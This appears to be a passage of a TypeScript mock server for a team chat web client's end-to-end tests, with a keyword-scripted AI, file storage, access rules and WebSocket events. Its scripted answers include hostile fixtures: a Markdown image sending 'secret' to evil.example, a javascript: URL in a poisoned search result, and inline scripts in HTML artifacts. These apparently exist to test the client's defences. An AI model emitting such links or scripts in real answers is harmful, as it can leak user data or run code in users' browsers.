// A mock team server for the web client's end-to-end tests: the REST API of shared/src/api (every response is
// checked against the contract schema, every JSON body is validated like the real server does), the WebSocket
// protocol of ws.ts (hello / seq / resume / reset), and the built web app served by the real serveWeb() of
// server/src/routes/web.ts (same CSP and cache headers as production).
//
// The AI is scripted by keywords in the message: "artifact", "react", "ask", "error", "slow", "files", "search",
// "cap-tools" / "cap-time" (the answer pauses at the per-answer limit of tool calls / time: done with stopReason);
// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image.
// Test-only controls: POST /__test/reset {setup?: boolean, teamLocale?: 'ko'|'en'|'id' (default ko), usersFollowTeam?:
// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password)}, POST /__test/drop-ws, POST /__test/server-version,
// POST /__test/revoke {path} (a folder becomes invisible to everyone + access_changed notice).
// External services: an address on a "down." host fails its check, the key "wrong-key" is refused, the fake MCP server
// offers two tools at the first check and a third from the next one, and a sign-in completes on the second poll.
import { z } from 'zod'
// Keep the server renderer outside the browser TypeScript program; this module runs only in Bun.
const hwpEngine = import('../../../server/src/files/' + 'hwp-engine.ts').then(m => new m.NativeHwpEngine())
import {
  ApiErrorResponse, CSRF_HEADER, type SkillChange, type SkillManagerGrant, type SkillSuggestion, DEV_SESSION_COOKIE, CHAT_ERROR_MESSAGES, type ChatErrorReason, ERROR_MESSAGES, LOCALE_HEADER, Locale, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
  type ApiName, type Artifact, type Attachment, type Chat, type Endpoint, type ErrorCode, type FileEntry, type FileVersion, type Folder, type Group, type Invite, type Job, type Me, type Message,
  MemberEngineChoice, type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry,
} from '@mycel/shared/api'
import fs from 'node:fs'
import * as XLSX from 'xlsx'
import { CCITT_SCAN, JPX_SCAN, makeCidPdf, makeImagePdf, makePdf } from '../../../tests/lib/pdf'
import { serveWeb } from '../../../server/src/routes/web-static'
import { TEXT as TEAM_ICON_TEXT } from '../../../server/src/admin/team-icon'
import { checkTeamIcon, TEAM_ICON_MAX_BYTES, type TeamIconFile } from '@mycel/shared'
import { Sealer } from '../../../server/src/credentials/seal'
import type { Credential, CredentialKind, CredentialLogin } from '@mycel/shared/api'
import type { Integration, IntegrationAccess, IntegrationFlow, IntegrationInput, IntegrationPatch, IntegrationTool } from '@mycel/shared/api'
import os from 'node:os'
import path from 'node:path'
import { MockPlugins } from './plugins'

type Json = Record<string, unknown>
const sha256Hex = (d: Uint8Array) => new Bun.CryptoHasher('sha256').update(d).digest('hex')
const parentOf = (p: string) => (p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '')
/** like a server whose relay.officialAvailable is off: the official relay is not offered */
const defaultConnection = (): ConnectionStatus => ({ mode: 'self-relay', address: 'http://acme.localhost:19143', state: 'connecting', detail: null, connectedSince: null, direct: { enabled: false, port: 8443, fingerprintSha256: null }, teamName: 'acme', availableModes: ['self-relay', 'direct-only'] })
class Fail extends Error {
  constructor(public code: ErrorCode, public status: number, msg?: string, public fields?: Record<string, string>, public params?: Record<string, string | number | boolean>) {
    super(msg ?? ERROR_MESSAGES[code].ko)
  }
}
const fail = (code: ErrorCode, status: number, msg?: string, fields?: Record<string, string>): never => {
  throw new Fail(code, status, msg, fields)
}
/** Like server/src/admin/users.ts temporaryFor: a typed temporary password must be ASCII, 8+ and not a common one. */
function checkTemp(pw: string | undefined): void {
  if (pw === undefined) return
  if (!/^[\x21-\x7e]+$/.test(pw)) fail('validation', 400, '임시 비밀번호에는 영문·숫자·기호만 쓸 수 있습니다(공백·한글 불가). 한/영 키를 확인해 주세요.', { 'body.temporaryPassword': 'letters, digits and symbols only' })
  if (['12345678', 'password', 'qwerty123'].includes(pw.toLowerCase())) fail('validation', 400, '더 안전한 비밀번호를 정해 주세요. 너무 흔한 비밀번호입니다.', { 'body.temporaryPassword': 'this password is too common' })
}
const tempUntil = () => new Date(Date.now() + 7 * 86400_000).toISOString()
const now = () => new Date().toISOString()
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

interface FileNode { type: 'file' | 'folder'; data?: Uint8Array; mtime: string; mime?: string }
interface WsData { user: string; windowId: string; epoch: string | null; after: number | null }
interface Ctx { user: User; params: Record<string, string>; query: Record<string, string>; body: any; req: Request; file?: File }
type Handler = (c: Ctx) => unknown | Promise<unknown>

const enc = new TextEncoder()
const dec = new TextDecoder()

const OWNER_PASSWORD = 'correct horse battery'

/** like server/src/admin/settings.ts LOCALE_CHANGED */
const LOCALE_CHANGED = { type: 'notice', data: { level: 'info', code: 'locale_changed', message: '' } } as const
/** like server/src/admin/settings.ts BROWSER_POLICY_CHANGED */
const BROWSER_POLICY_CHANGED = { type: 'notice', data: { level: 'info', code: 'browser_policy_changed', message: '' } } as const
/** like server/src/admin/team-icon.ts TEAM_ICON_CHANGED */
const TEAM_ICON_CHANGED = { type: 'notice', data: { level: 'info', code: 'team_icon_changed', message: '' } } as const

export class MockServer {
  setupNeeded = false
  serverVersion = '0.1.0'
  epoch = uuidv7()
  seq = 0
  buffer: { seq: number; text: string }[] = []
  sockets = new Set<Bun.ServerWebSocket<WsData>>()
  sessions = new Map<string, string>() // token -> user id
  /** people whose latest sign-in used a temporary password (Me.session.tempLogin while they must change it) */
  tempLogins = new Set<string>()
  users: User[] = []
  passwords = new Map<string, string>()
  /** last password reset by an admin, per user id (Me.passwordReset) */
  resets = new Map<string, NonNullable<Me['passwordReset']>>()
  groups: Group[] = []
  invites: (Invite & { token: string })[] = []
  folders: Folder[] = []
  chats: Chat[] = []
  messages: Message[] = []
  artifacts: Artifact[] = []
  projects: Project[] = []
  memories: Memory[] = []
  budgets: Budget[] = []
  files = new Map<string, FileNode>()
  versions: FileVersion[] = []
  connection: ConnectionStatus = defaultConnection()
  trash: (TrashItem & { node: FileNode })[] = []
  uploads = new Map<string, UploadSession & { chunks: Map<number, Uint8Array> }>()
  attachments = new Map<string, Attachment & { data: Uint8Array }>()
  jobs = new Map<string, Job>()
  pendingAsk = new Map<string, (v: unknown) => void>()
  /** open cards by turn (GET /api/chats/:id/requests after a reload) */
  openAsks = new Map<string, { turnId: string; chatId: string; messageId: string; request: TurnRequest }>()
  stopped = new Set<string>()
  queuePositions = new Map<string, number>()
  queueRevision = 0
  settings: TeamSettings = defaultSettings()
  /** the team logo (Admin > Team settings): served by the real serveWeb() at /team-icon, /favicon.ico, the manifest */
  teamIcon: TeamIconFile | null = null
  speechKey: { set: boolean; hint: string | null; updatedAt: string | null } = { set: false, hint: null, updatedAt: null }
  /** every request the client made (method + path), for assertions */
  log: string[] = []
  /** team skills: "팀 스킬 관리" grants (also kept as folder rules on this.folders), suggestions, changes under skills/ */
  skillManagers: SkillManagerGrant[] = []
  suggestions: SkillSuggestion[] = []
  skillChanges: SkillChange[] = []
  /** engine / model named in chat requests (tests check people who may not pick never send one) */
  engineRequests: { name: string; user: string; engine?: unknown; model?: unknown }[] = []
  /** Admin > AI engines: "팀원이 엔진 고르기 허용" and the Claude-limit fallback (like the server: off by default) */
  memberChoice: MemberEngineChoice = { mode: 'off', groupIds: [], userIds: [] }
  limitFallback = false
  codexEnabled = true
  /** Admin > AI connections: the team's connections (secrets are opened with the real server sealing code and dropped) */
  credentials: Credential[] = []
  credMemberOwn = true
  credSharedSubscriptions = false
  credLogins = new Map<string, CredentialLogin & { userId: string; personal: boolean; label: string }>()
  sealer = new Sealer(fs.mkdtempSync(path.join(os.tmpdir(), 'mycel-mock-seal-')))
  /** External services (like server/src/integrations): personal and team connections. Keys and tokens are kept apart
   * and never go back out (only `hasSecret`). */
  integrations: MockIntegration[] = []
  plugins = new MockPlugins()
  integrationSecrets = new Map<string, string>()
  integrationFlows = new Map<string, { flow: IntegrationFlow; integrationId: string; userId: string; polls: number }>()
  /** Team AX Cloud (server/src/system/deployment.ts): /__test/cloud switches it on until the next reset */
  cloud = false

  constructor(o: { setup?: boolean } = {}) {
    this.reset(o)
  }

  generation = 0

  /** seeded people (olga, bob) have no language of their own */
  usersFollowTeam = false

  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string } = {}) {
    this.generation++
    this.setupNeeded = !!o.setup
    this.usersFollowTeam = !!o.usersFollowTeam
    this.serverVersion = '0.1.0'
    this.cloud = false
    this.epoch = uuidv7()
    this.seq = 0
    this.buffer = []
    for (const ws of this.sockets) ws.close(1012, 'reset')
    this.sessions.clear()
    this.tempLogins.clear()
    this.passwords.clear()
    this.resets.clear()
    this.users = []
    this.groups = []
    this.invites = []
    this.chats = []
    this.messages = []
    this.artifacts = []
    this.projects = []
    this.memories = []
    this.budgets = []
    this.versions = []
    this.trash = []
    this.uploads.clear()
    this.attachments.clear()
    this.jobs.clear()
    this.files.clear()
    this.log = []
    this.engineRequests = []
    this.skillManagers = []
    this.suggestions = []
    this.skillChanges = []
    this.memberChoice = { mode: 'off', groupIds: [], userIds: [] }
    this.limitFallback = false
    this.codexEnabled = true
    this.credentials = []
    this.credMemberOwn = true
    this.credSharedSubscriptions = false
    this.credLogins.clear()
    this.integrations = []
    this.plugins.reset()
    this.integrationSecrets.clear()
    this.integrationFlows.clear()
    this.settings = defaultSettings()
    this.teamIcon = null
    this.speechKey = { set: false, hint: null, updatedAt: null }
    if (o.teamLocale) this.settings.defaultLocale = o.teamLocale
    this.activeLeaf.clear()
    this.pendingAsk.clear()
    this.openAsks.clear()
    this.stopped.clear()
    this.queuePositions.clear()
    this.queueRevision = 0
    this.revoked.clear()
    this.connection = defaultConnection()
    if (!this.setupNeeded) this.seed()
    for (const u of this.users) if (u.username === o.mustChange) u.mustChangePassword = true
  }

  seed() {
    const g: Group = { id: uuidv7(), name: '재무팀', description: '재무 자료', memberIds: ['olga'] }
    this.groups = [g]
    const own = this.usersFollowTeam ? null : 'ko'
    this.addUser({ id: 'olga', username: 'olga', name: 'Olga', role: 'owner', groupIds: [g.id], localeChoice: own }, OWNER_PASSWORD)
    this.addUser({ id: 'bob', username: 'bob', name: 'Bob', role: 'member', groupIds: [], localeChoice: own }, 'bob password 1')
    for (const p of ['docs', 'finance', 'finance/2026', 'marketing', 'secret', 'users', 'users/olga']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('marketing/plan.md', '# Plan\n\n- launch\n- grow\n')
    this.putFile('marketing/data.csv', 'name,value\nalpha,1\nbeta,2\n')
    this.putFile('marketing/notes.txt', 'hello notes')
    this.putFile('finance/2026/q3.csv', 'q,amount\nq3,100\n')
    this.putFile('marketing/page.html', '<h1>Hi</h1><script>document.body.append("ran")</script>')
    this.putFile('marketing/plan (충돌 사본 - Bob 2026-10-21 10.00).md', '# Plan conflicting\n')
    for (const [p, data] of officeFixtures()) this.putFile(p, data)
    for (const p of ['skills', 'skills/재무']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('skills/team-rules.md', '# 팀 규칙\n- 금액은 원 단위로 쓴다\n')
    this.folders = [
      { id: uuidv7(), path: 'finance', exists: true, createdAt: now(), rules: [] },
    ]
    this.folders[0]!.rules = [{ id: uuidv7(), folderId: this.folders[0]!.id, subjectType: 'group', subjectId: g.id, access: 'read', updatedBy: null, updatedAt: now() }]
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 1, sha256: 'a'.repeat(64), size: 20, author: { id: 'bob', name: 'Bob' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'olga', name: 'Olga' }, savedTurnId: null })
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 2, sha256: 'b'.repeat(64), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'bob', name: 'Bob' }, savedTurnId: null })
    // a version identical to the file as it is now (after a restore): shown as "same as now", not offered
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 3, sha256: sha256Hex(this.files.get('marketing/plan.md')!.data!), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'restore', conflictPath: null, createdAt: now() })
    // finance is read-only for the owner here: versions can be downloaded, not restored
    this.versions.push({ id: uuidv7(), path: 'finance/2026/q3.csv', version: 1, sha256: 'c'.repeat(64), size: 12, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
  }

  /** like the server: people without their own language see the team default */
  syncLocales() {
    for (const u of this.users) u.locale = u.localeChoice ?? this.settings.defaultLocale
  }

  addUser(u: Pick<User, 'id' | 'username' | 'name' | 'role' | 'groupIds'> & { mustChangePassword?: boolean; localeChoice?: Locale | null }, password: string) {
    const user: User = { email: null, status: 'active', mustChangePassword: false, locale: 'ko', localeChoice: null, createdAt: now(), lastSeenAt: null, ...u }
    user.locale = user.localeChoice ?? this.settings.defaultLocale
    this.users.push(user)
    this.passwords.set(user.username, password)
    return user
  }

  /** "name (2).ext", "name (3).ext", …: the first one not taken (onExists rename) */
  freePath(p: string): string {
    for (let i = 2; ; i++) {
      const q = p.replace(/(\.[^./]+)?$/, (ext: string) => ` (${i})${ext}`)
      if (!this.files.has(q)) return q
    }
  }

  putFile(path: string, content: string | Uint8Array) {
    const data = typeof content === 'string' ? enc.encode(content) : content
    this.files.set(path, { type: 'file', data, mtime: now() })
  }

  // ---------------- access (simplified policy) ----------------
  /** folders taken away from everyone by POST /__test/revoke (an admin's rule change) */
  revoked = new Set<string>()
  access(path: string, user: User): 'none' | 'read' | 'write' {
    if (path === '' ) return 'write'
    if ([...this.revoked].some((r) => path === r || path.startsWith(r + '/'))) return 'none'
    if (path === 'secret' || path.startsWith('secret/')) return 'none'
    if (path.startsWith('users/')) {
      const owner = path.split('/')[1]
      return owner === user.id || user.role === 'owner' ? 'write' : 'none'
    }
    if (path === 'finance' || path.startsWith('finance/')) return user.role === 'owner' ? 'read' : 'none'
    return 'write'
  }

  entry(path: string, n: FileNode, user: User): FileEntry {
    return { name: path.slice(path.lastIndexOf('/') + 1), path, type: n.type, size: n.type === 'file' ? n.data!.byteLength : null, mtime: n.mtime, mime: n.type === 'file' ? mimeOf(path) : null, access: this.access(path, user) }
  }

  // ---------------- team skills (like server/src/skills/*) ----------------
  skillChange(c: SkillChange) {
    this.skillChanges.unshift(c)
    const dir = c.path.slice(0, c.path.lastIndexOf('/'))
    this.publish({ type: 'notice', data: { level: 'info', code: 'skill_changed', message: `팀 스킬이 바뀌었어요: ${c.path} (${c.actor?.name ?? ''}${c.byAi ? ', AI가 저장' : ''})`, link: `/files?path=${encodeURIComponent(dir)}&select=${encodeURIComponent(c.path)}&history=${encodeURIComponent(c.path)}` } })
  }
  /** skills folders this person may change: owner / admin everything, others their own or their group's write rules */
  managed(u: User): string[] {
    if (u.role === 'owner' || u.role === 'admin') return ['skills']
    return this.skillManagers.filter((g) => (g.subjectType === 'user' && g.subjectId === u.id) || (g.subjectType === 'group' && u.groupIds.includes(g.subjectId))).map((g) => g.path)
  }
  manages(u: User, folder: string) {
    return this.managed(u).some((m) => folder === m || folder.startsWith(m + '/'))
  }
  suggestionFor(s: SkillSuggestion, u: User): SkillSuggestion {
    return { ...s, canReview: this.manages(u, s.targetFolder) }
  }
  skillManagersResponse() {
    return { folders: ['skills', 'skills/재무'], items: this.skillManagers }
  }

  // ---------------- realtime ----------------
  publish(ev: ServerEventInput) {
    const full = { ...ev, seq: ++this.seq, at: Date.now() }
    ServerEvent.parse(full)
    const text = JSON.stringify(full)
    this.buffer.push({ seq: full.seq, text })
    if (this.buffer.length > 5000) this.buffer.shift()
    for (const ws of this.sockets) ws.send(text)
  }

  // ---------------- helpers ----------------
  /** like server/src/admin/engine-choice.ts: owner / admins always, others as the admin allows */
  canChoose(u: User): boolean {
    if (u.role === 'owner' || u.role === 'admin') return true
    const c = this.memberChoice
    return c.mode === 'everyone' || (c.mode === 'selected' && (c.userIds.includes(u.id) || u.groupIds.some((g) => c.groupIds.includes(g))))
  }
  /** like the server: someone who may not pick naming another engine or model than they get anyway -> 403 */
  guardEngine(name: string, u: User, body: { engine?: unknown; model?: unknown }, current: { engine: string; model: string | null }) {
    if (body.engine === undefined && body.model === undefined) return
    this.engineRequests.push({ name, user: u.id, engine: body.engine, model: body.model })
    if (this.canChoose(u)) return
    if ((body.engine !== undefined && body.engine !== current.engine) || (body.model !== undefined && (body.model ?? null) !== current.model))
      fail('forbidden', 403, 'AI 엔진과 모델은 관리자가 정합니다. 엔진을 고르지 말고 보내면 팀 기본 엔진으로 답합니다.')
  }
  me(u: User, sid: string): Me {
    const prefs = { ...((u as User & { prefs?: Me['user']['prefs'] }).prefs ?? {}) }
    const choose = this.canChoose(u)
    if (!choose) { delete prefs.engine; delete prefs.model }
    return {
      user: { id: u.id, username: u.username, name: u.name, email: u.email, role: u.role, locale: u.localeChoice ?? this.settings.defaultLocale, localeChoice: u.localeChoice, mustChangePassword: u.mustChangePassword, prefs, canChooseEngine: choose },
      groups: this.groups.filter((g) => u.groupIds.includes(g.id)).map((g) => ({ id: g.id, name: g.name })),
      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale, browserAllowAll: this.settings.browserAllowAll, iconVersion: this.teamIcon?.version ?? null, voiceInput: this.settings.speechProvider === 'local' || (this.settings.speechProvider === 'openrouter' && this.speechKey.set), chatTrashRetentionDays: this.settings.chatTrashRetentionDays },
      session: { id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', expiresAt: new Date(Date.now() + 30 * 86400_000).toISOString(), tempLogin: u.mustChangePassword && this.tempLogins.has(u.id) },
      server: {
        version: this.serverVersion, dev: !this.cloud, deployment: this.cloud ? 'hosted' : 'self', timeZone: this.settings.timeZone,
        features: this.cloud
          ? { connectionChange: false, selfUpdate: false, officeUpdate: false, connectedFolders: false, apiEngineAnyUrl: false, hostDiagnostics: false, pluginFileInstall: false }
          : { connectionChange: true, selfUpdate: true, officeUpdate: false, connectedFolders: true, apiEngineAnyUrl: true, hostDiagnostics: true, pluginFileInstall: true },
      },
      passwordReset: this.resets.get(u.id) ?? null,
    }
    void sid
  }

  startSession(u: User) {
    const token = uuidv7()
    this.sessions.set(token, u.id)
    return `${DEV_SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax`
  }

  userOf(req: Request): User | null {
    const cookie = req.headers.get('cookie') ?? ''
    const m = cookie.match(new RegExp(`${DEV_SESSION_COOKIE}=([^;]+)`))
    const id = m ? this.sessions.get(m[1]!) : undefined
    return this.users.find((u) => u.id === id && u.status === 'active') ?? null
  }

  branchInfo(m: Message): Message['branch'] {
    const sibs = this.messages.filter((x) => x.chatId === m.chatId && x.parentId === m.parentId && x.role === m.role)
    return { index: sibs.findIndex((x) => x.id === m.id), count: sibs.length, siblingIds: sibs.map((x) => x.id) }
  }
  view(m: Message): Message {
    return { ...m, branch: this.branchInfo(m) }
  }
  activeLeaf = new Map<string, string>()
  path(chatId: string): Message[] {
    const leaf = this.activeLeaf.get(chatId)
    const out: Message[] = []
    let cur = leaf ? this.messages.find((m) => m.id === leaf) : undefined
    while (cur) {
      out.unshift(this.view(cur))
      const pid: string | null = cur.parentId
      cur = pid ? this.messages.find((m) => m.id === pid) : undefined
    }
    return out
  }
  newestLeafUnder(id: string): string {
    let cur = id
    for (;;) {
      const kids = this.messages.filter((m) => m.parentId === cur)
      if (!kids.length) return cur
      cur = kids[kids.length - 1]!.id
    }
  }

  message(o: Partial<Message> & Pick<Message, 'chatId' | 'role' | 'parentId'>): Message {
    const m: Message = { id: uuidv7(), author: null, content: '', attachments: [], steps: [], status: 'done', error: null, turnId: null, engine: null, model: null, files: null, usage: null, createdAt: now(), branch: { index: 0, count: 1, siblingIds: [] }, ...o }
    this.messages.push(m)
    return m
  }

  /** The scripted AI. */
  async runTurn(chatId: string, user: User, prompt: string, assistant: Message) {
    const turnId = assistant.turnId!
    const gen = this.generation
    const pub = (ev: ServerEventInput) => {
      if (gen !== this.generation) throw new Error('mock was reset')
      this.publish(ev)
    }
    const slow = /slow/i.test(prompt)
    const step = (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>): Step => ({ status: 'running', startedAt: now(), endedAt: null, ...s })
    await sleep(60)
    while ((this.queuePositions.get(chatId) ?? 0) > 0 && !this.stopped.has(turnId)) {
      if (gen !== this.generation) return
      await sleep(20)
    }
    this.queuePositions.delete(chatId)
    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0, epoch: this.epoch, revision: ++this.queueRevision } })
    const s1 = step({ id: 's1', kind: 'tool', tool: 'grep', label: 'grep "plan" in marketing/' })
    assistant.steps = [s1]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1 } })
    await sleep(80)
    const s1done = { ...s1, status: 'ok' as const, endedAt: now() }
    assistant.steps = [s1done]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1done } })
    if (/search/i.test(prompt)) {
      const s2 = step({ id: 's2', kind: 'web_search', tool: 'WebSearch', label: 'Web search "team ax"', status: 'ok', endedAt: now(), sources: [{ title: 'Example result', url: 'https://example.com/a' }, { title: 'Poisoned result', url: 'javascript:top.document.title="pwned-search"' }] })
      assistant.steps = [...assistant.steps, s2]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
    }
    if (/ask/i.test(prompt)) {
      const requestId = 'q1'
      const request: TurnRequest = /safety/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, question: 'AI가 이 대화에 나온 적 없는 주소를 열려고 합니다.\n\nhttps://example.com/?d=1', options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
        : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/skillsave/i.test(prompt)) {
      // like server/src/chat/turn.ts confirmSkillWrite: the server's card before anything is saved under skills/
      const requestId = 'k1'
      const after = '---\nname: 주간 보고서\ndescription: 이번 주 회의록으로 보고서를 만든다\n---\n1. 회의록을 읽는다\n2. 표로 정리한다\n'
      const request: TurnRequest = {
        kind: 'ask_user', origin: 'server', requestId, allowText: false, multiple: false,
        question: '팀 스킬/규칙으로 저장할까요? 팀 전체 AI가 따릅니다.\n\nskills/weekly.md (새 팀 스킬 "주간 보고서")',
        options: [{ label: '저장', value: 'save' }, { label: '저장하지 않기', value: 'skip' }],
        preview: { kind: 'skill_write', path: 'skills/weekly.md', isNew: true, skillName: '주간 보고서', diff: '@@ -0,0 +1,6 @@\n' + after.trimEnd().split('\n').map((l) => '+' + l).join('\n'), added: 6, removed: 0, truncated: false },
      }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      const saved = answer === 'save' || (Array.isArray(answer) && answer[0] === 'save')
      if (saved) {
        this.putFile('skills/weekly.md', after)
        this.skillChange({ id: uuidv7(), at: now(), actor: { id: user.id, name: user.name }, path: 'skills/weekly.md', change: 'create', from: null, byAi: true, kind: 'skill' })
      }
      const text = saved ? 'Saved skills/weekly.md.' : 'Not saved: you did not allow saving under skills/.'
      assistant.content = text
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset: 0, text } })
      assistant.status = 'done'
      if (saved) assistant.files = { saved: [{ path: 'skills/weekly.md', action: 'create' }], conflicts: [], rejected: [] }
      const chat = this.chats.find((c) => c.id === chatId)!
      chat.runState = 'idle'
      if (!chat.title) chat.title = 'skill'
      pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: 'done', message: this.view(assistant) } })
      pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
      return
    }
    if (/artifact|react/i.test(prompt)) {
      const react = /react/i.test(prompt)
      const key = react ? 'counter' : 'hello-page'
      const content = react && /d3/i.test(prompt)
        ? 'import * as d3 from "d3"\nexport default function App() {\n  return <p>{d3.sum([1, 2])}</p>\n}\n'
        : react
        ? 'import { useState } from "react"\nimport { Plus } from "lucide-react"\nexport default function App() {\n  const [n, setN] = useState(0)\n  return <button className="rounded bg-emerald-600 px-3 py-2 text-white" onClick={() => setN(n + 1)}><Plus size={14} /> count {n}</button>\n}\n'
        : /broken/i.test(prompt)
          ? '<h1>Broken</h1><script>throw new Error("boom")</script>'
          : /wander/i.test(prompt)
            ? `<h1>Wanderer</h1><script>setTimeout(function () { location.href = ${JSON.stringify(/home/i.test(prompt) ? "/" : "https://example.com/")} }, 1500)</script>`
          : '<h1 id="t">Hello artifact</h1><script>document.getElementById("t").textContent += " (ran)"; fetch("https://example.com/x").catch(()=>{})</script>'
      const type = react ? ('react' as const) : ('html' as const)
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: react ? 'Counter' : 'Hello page', status: 'writing', content: content.slice(0, 20), artifact: null } })
      await sleep(120)
      const prev = this.artifacts.filter((a) => a.chatId === chatId && a.key === key)
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key, version: prev.length + 1, type, title: react ? 'Counter' : 'Hello page', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    const capped = /cap-tools/i.test(prompt) ? 'tool_limit' as const : /cap-time/i.test(prompt) ? 'time_limit' as const : null
    const text = /error/i.test(prompt)
      ? ''
      : capped
        ? 'Sorting the applications into the table.\n\n- Read 20 of 40 so far\n- Scored each one against the job description\n- Saved the first half to the shared sheet\n\nThe rest are still in the folder; this answer stopped before reaching them.'
      : prompt.includes('answered:')
        ? `You chose ${prompt.split('answered:')[1]}.`
        : /artifact|react/i.test(prompt)
          ? 'I made an artifact for you.'
          : `Here is **the answer** for: ${prompt.slice(0, 40)}\n\n| name | value |\n|---|---|\n| alpha | 1 |\n| beta | 2 |\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\nMath: $x^2 + 1$ and a price of $5.\n\n![chart](https://evil.example/collect?d=secret)\n\n\`\`\`mermaid\ngraph TD; A-->B\n\`\`\`\n\n[plan](/api/files/download?path=marketing%2Fplan.md)\n`
    const chunks = text.match(/[\s\S]{1,12}/g) ?? []
    for (const piece of chunks) {
      if (this.stopped.has(turnId)) break
      const offset = assistant.content.length
      assistant.content += piece
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset, text: piece } })
      await sleep(slow ? 150 : 15)
    }
    assistant.status = this.stopped.has(turnId) ? 'stopped' : /error/i.test(prompt) ? 'error' : 'done'
    // like server/src/chat/turn.ts at a per-answer limit: 'done', not an error, with the reason
    if (assistant.status === 'done' && capped) assistant.stopReason = capped
    // like a fresh engine session (Codex every turn, an edit): history before this message past 40,000 characters
    // reaches the AI only in part (server/src/chat/prompt.ts historyWindow)
    let earlier = 0
    const asked = this.messages.find((m) => m.id === assistant.parentId)
    for (let cur = asked ? this.messages.find((m) => m.id === asked.parentId) : undefined; cur; cur = this.messages.find((m) => m.id === cur!.parentId)) earlier += cur.content.length + 'Assistant: '.length
    if (assistant.status !== 'error' && earlier > 40_000) assistant.historyTrimmed = true
    if (assistant.status === 'error') {
      assistant.error = { code: 'engine_unavailable', message: ERROR_MESSAGES.engine_unavailable.ko }
      // Stored chat-error fixtures, delivered through both message.done and listMessages.
      const fixture = /^(legacy )?error:(\w+)\n/.exec(prompt)
      if (fixture && Object.hasOwn(CHAT_ERROR_MESSAGES, fixture[2]!)) {
        const reason = fixture[2] as ChatErrorReason
        const text = CHAT_ERROR_MESSAGES[reason]
        assistant.error = { code: text.code, message: text.ko, ...(fixture[1] ? {} : { params: { reason } }) }
      } else if (fixture?.[2] === 'unknown') assistant.error.message = 'Unknown upstream failure'
      else if (fixture?.[2] === 'future') assistant.error.params = { reason: 'future_failure' }
    }
    if (/files/i.test(prompt)) {
      this.putFile('marketing/report.md', '# Report\n')
      assistant.files = { saved: [{ path: 'marketing/report.md', action: 'create' }], conflicts: [{ path: 'marketing/plan.md', copyPath: 'marketing/plan (충돌 사본 - AI).md' }], rejected: [{ path: 'finance/2026/q3.csv', reason: 'read only' }] }
      pub({ type: 'files.changed', data: { changes: [{ path: 'marketing/report.md', action: 'create', by: null, turnId }] } })
    }
    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
    assistant.model = 'claude-sonnet'
    assistant.engine = 'claude-code'
    const chat = this.chats.find((c) => c.id === chatId)!
    chat.runState = 'idle'
    chat.updatedAt = now()
    if (!chat.title) chat.title = prompt.slice(0, 30)
    this.queueRevision++
    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
    void user
  }

  startTurn(chatId: string, user: User, prompt: string, parentId: string): Message {
    const chat = this.chats.find((c) => c.id === chatId)!
    const turnId = uuidv7()
    const assistant = this.message({ chatId, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
    this.activeLeaf.set(chatId, assistant.id)
    if (/queue-hold/.test(prompt)) this.queuePositions.set(chatId, 3)
